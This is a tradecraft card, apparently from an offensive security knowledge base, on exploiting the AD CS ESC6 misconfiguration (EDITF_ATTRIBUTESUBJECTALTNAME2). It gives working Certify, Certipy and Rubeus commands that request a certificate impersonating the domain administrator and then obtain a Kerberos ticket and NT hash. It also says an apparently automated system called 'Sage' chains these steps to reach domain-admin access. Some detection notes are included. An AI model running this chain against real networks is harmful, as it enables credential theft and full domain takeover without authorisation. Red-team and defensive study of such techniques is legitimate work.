---
name: ADCS ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2
category: adcs
subcategories: [esc6, ca-misconfiguration, attribute-san, any-template-esc1]
tradecraft_tags: [adcs, esc6, ca-flag, san, esc1-equivalent, any-template, certify]
mitre_attack:
  - id: T1649
    name: Steal or Forge Authentication Certificates
source:
  url: https://posts.specterops.io/certified-pre-owned-d95910965cd2
  license: none
  maintained: false
binary_type: none
binary_filename: ""
supported_os: [windows]
architecture: [x64]
privilege_required: domain-user
network_required: true
detection_signal: |
  Certificate enrollment with a Subject Alternative Name on a template that doesn't
  normally support SAN enrollment is detectable in CA audit logs (request contains SAN
  despite template not having ENROLLEE_SUPPLIES_SUBJECT). Event 4886 (cert issued) +
  Event 4887 (cert request with non-standard SAN). MDI ADCS security checks detect
  EDITF_ATTRIBUTESUBJECTALTNAME2.
usage_examples:
  - description: Identify ESC6 — check if CA has EDITF_ATTRIBUTESUBJECTALTNAME2 flag
    args: "Certify.exe find"
  - description: Exploit ESC6 — request any template with arbitrary SAN
    args: "Certify.exe request /ca:CASERVER\\\\CA-NAME /template:User /altname:administrator"
  - description: Certipy ESC6 detection and exploitation
    args: "certipy find -u user -p pass -dc-ip DC_IP -vulnerable"
opsec_notes: |
  ESC6 is a CA-level misconfiguration — the flag is set on the Certificate Authority itself
  (not on individual templates). When present, ANY template that allows enrollment becomes
  ESC1-equivalent (any enrolled certificate can include arbitrary SAN). Detection focuses
  on unusual SANs in certificate requests. Certify's `find` will identify ESC6.
gotchas: |
  EDITF_ATTRIBUTESUBJECTALTNAME2 is typically only present due to misconfiguration (it's
  not the default). The exploitation is identical to ESC1 — the only difference is that
  the template doesn't need the ENROLLEE_SUPPLIES_SUBJECT flag when the CA has this global
  flag set. Verify the flag is set using Certify `find` output before attempting this path.
related_ttps: [certify, certipy, rubeus, adcs-esc8, adcs-esc4]
alternatives: [adcs-esc1, adcs-esc4]
common_args: {}
last_updated: 2026-05-29
---

# ADCS ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2

A CA-level misconfiguration where the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag is set on the
Certificate Authority. This flag allows ANY certificate enrollment request to include a
Subject Alternative Name regardless of the template configuration — making every enrollable
template effectively ESC1-vulnerable.

## Identification

Certify `find` output showing ESC6:
```
[!] CA Attribute SubjectAltName is set on CA: CASERVER\CA-NAME
[*] Vulnerable CA flag: EDITF_ATTRIBUTESUBJECTALTNAME2
```

## Exploitation

Identical to ESC1 — pick any template the current user can enroll in (e.g. `User`),
add an arbitrary SAN (`/altname:administrator`):

```
Certify.exe request /ca:CASERVER\CA-NAME /template:User /altname:administrator@domain.local
Rubeus.exe asktgt /user:administrator /certificate:<pfx> /getcredentials /show /ptt
```

## How Sage uses this

When Certify/Certipy identifies ESC6, Sage follows the same PKINIT chain as ESC1:
request cert → Rubeus PKINIT → UnPAC-the-hash → NT hash for DA access.
